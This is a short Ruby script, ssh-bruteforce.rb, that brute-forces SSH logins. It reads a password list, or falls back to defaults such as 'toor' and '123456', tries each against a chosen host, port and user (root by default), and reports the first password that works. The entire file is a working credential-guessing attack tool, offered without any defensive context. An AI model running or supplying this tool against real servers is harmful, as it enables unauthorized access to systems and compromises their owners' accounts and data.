#!/usr/bin/ruby
#Snippet: ssh-bruteforce.rb
require 'net/ssh'

#Main function: Try password
def attempt_login(host, port, username, password)
    begin
        Net::SSH.start(host, username, password: password, port: port, non_interactive: true, timeout: 5) do
            puts "[*] Success: #{username}:#{password}"
        end
        true
    rescue
        false
    end
end

#Main bruteforce function
def bruteforce_ssh(host, port, username, passwords)
    passwords.each do|password|
        return if attempt_login(host, port, username, password)
    end
end

#Defaults and user input
host = ARGV[0]||"127.0.0.1"       #Target SSH server
port = (ARGV[1]||22).to_i         #Port number
username = ARGV[2]||"root"        #Username
password_file = ARGV[3]||nil      #Password file
passwords = password_file ? File.readlines(password_file, chomp: true) : ["toor", "123456", "password"]

#Start bruteforcing
puts "[*] Targeting #{host}:#{port} with user '#{username}'..."
bruteforce_ssh(host, port, username, passwords)
puts "[*] Bruteforce finished."
